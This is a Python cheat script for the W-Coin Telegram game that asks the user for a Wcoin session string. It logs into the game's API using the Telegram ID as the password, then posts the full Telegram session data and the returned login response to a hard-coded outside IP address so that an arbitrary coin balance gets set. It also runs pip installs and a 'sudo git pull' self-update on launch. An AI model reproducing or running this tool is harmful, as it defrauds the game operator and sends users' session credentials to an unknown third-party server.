import os
import subprocess
import sys
import importlib.util

# Function to check and install required libraries
def install_requirements():
    required_libraries = {
        "pyfiglet": "pyfiglet",
        "colorama": "colorama",
        "requests": "requests",
        "user_agent": "user-agent"  # 'user_agent' maps to the 'user-agent' package
    }
    
    for module_name, package_name in required_libraries.items():
        if importlib.util.find_spec(module_name) is None:
            print(f"Library {package_name} not found. Installing...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
            print(f"{package_name} installed successfully.")

# Call the function to check and install requirements
install_requirements()

# Importing the libraries after ensuring they are installed
import pyfiglet
from colorama import Fore, Style, init
import requests
import json
import time
from urllib.parse import urlparse, parse_qs
from user_agent import generate_user_agent

user_agent = generate_user_agent('android')
headers = {
    'accept': '*/*',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://alohomora-bucket-fra1-prod-frontend-static.fra1.cdn.digitaloceanspaces.com/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Android WebView";v="128"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'x-requested-with': 'org.telegram.plus',
}

init(autoreset=True)

# Function to check for updates from the GitHub repository
def check_for_updates():
    print(Fore.YELLOW + "Checking for updates...")
    repo_url = 'BLACK-NINJA-PK/W-Coin'  # Your GitHub repository
    # Get the latest commit hash from the GitHub repository
    api_url = f'https://api.github.com/repos/{repo_url}/commits/main'
    response = requests.get(api_url)
    latest_commit = response.json().get('sha')
    
    # Get the current commit hash
    current_commit = subprocess.check_output(["git", "rev-parse", "HEAD"]).strip().decode()

    if latest_commit != current_commit:
        print(Fore.RED + "New update available. Updating...")
        update_script()
    else:
        print(Fore.GREEN + "Your script is up to date.")

# Function to pull the latest changes from the repository
def update_script():
    try:
        # Use sudo if permission issues occur in pulling updates
        result = subprocess.run(["sudo", "git", "pull"], check=True, capture_output=True, text=True)
        print(result.stdout)  # Print output for debugging
        
        print(Fore.GREEN + "Script updated successfully!")
        # Instead of restarting the whole script, reload the current module to apply changes
        time.sleep(2)
        os.execv(sys.executable, ['python'] + sys.argv)  # Restart script after update
        
    except subprocess.CalledProcessError as e:
        print(Fore.RED + f"Failed to update the script: {e}")
    except PermissionError:
        print(Fore.RED + "Permission denied: Make sure you have proper access rights to update.")

# Existing functions for Wcoin and other features
def main_wcoin(session, amount):
    key = "GWWT"  # Automatically inserting the key here
    parsed_url = urlparse(session)
    query_params = parse_qs(parsed_url.fragment)
    tgWebAppData = query_params.get('tgWebAppData', [None])[0]
    user_data = parse_qs(tgWebAppData)['user'][0]
    user_data = json.loads(user_data)
    identifier = str(user_data['id'])
    json_data = {
            'identifier': identifier,
            'password': identifier,
        }
    res = requests.post('https://starfish-app-fknmx.ondigitalocean.app/wapi/api/auth/local', json=json_data).json()
    r = requests.post('http://213.218.240.167:5000/private',json={'initData':session,'serverData':res,'amount':amount,'key':key})
    return (r.json())

def create_gradient_banner(text):
    banner = pyfiglet.figlet_format(text, font='slant').splitlines()
    colors = [Fore.GREEN + Style.BRIGHT, Fore.YELLOW + Style.BRIGHT, Fore.RED + Style.BRIGHT]
    total_lines = len(banner)
    section_size = total_lines // len(colors)
    for i, line in enumerate(banner):
        if i < section_size:
            print(colors[0] + line)  # Green
        elif i < section_size * 2:
            print(colors[1] + line)  # Yellow
        else:
            print(colors[2] + line)  # Red

def print_info_box(social_media_usernames):
    colors = [Fore.CYAN, Fore.MAGENTA, Fore.LIGHTYELLOW_EX, Fore.BLUE, Fore.LIGHTWHITE_EX]
    
    box_width = max(len(social) + len(username) for social, username in social_media_usernames) + 4
    print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')
    
    for i, (social, username) in enumerate(social_media_usernames):
        color = colors[i % len(colors)]  # Cycle through colors
        print(color + f'| {social}: {username} |')
    
    print(Fore.WHITE + Style.BRIGHT + '+' + '-' * (box_width - 2) + '+')

if __name__ == "__main__":
    # Check for updates from your GitHub repository
    check_for_updates()

    banner_text = "NINJA"
    os.system('cls' if os.name == 'nt' else 'clear')
    create_gradient_banner(banner_text)
    social_media_usernames = [
        ("TELEGRAM", "@black_ninja_pk"),
        ("TELEGRAM", "@black_ninja_pk"),
          
        ("Coder", "@demoncratos"),
    ]
    
    print_info_box(social_media_usernames)
    user_input = input("\nPlease Enter Wcoin Session ID : ")
    balance_input = input("Please Enter Coin Amount : ")
    data = main_wcoin(user_input, int(balance_input))  # Removed the key parameter
    os.system('cls' if os.name == 'nt' else 'clear')
    create_gradient_banner('Done')

    try:
        print(Fore.GREEN + Style.BRIGHT + "=== User Information ===")
        print(Fore.YELLOW + f"Username: {data['username']}")
        print(Fore.CYAN + f"Email: {data['email']}")
        print(Fore.MAGENTA + f"Telegram Username: {data['telegram_username']}")
        print(Fore.BLUE + f"Balance: {data['balance']}") 
        print(Fore.LIGHTWHITE_EX + f"Clicks: {data['clicks']}")
        print(Fore.WHITE + f"Max Energy: {data['max_energy']}")
        print(Fore.GREEN + Style.BRIGHT + f"Created At: {data['createdAt']}")
        print(Fore.GREEN + Style.BRIGHT + "========================")
    
    except:
        print(Fore.RED + Style.BRIGHT + data['error'])
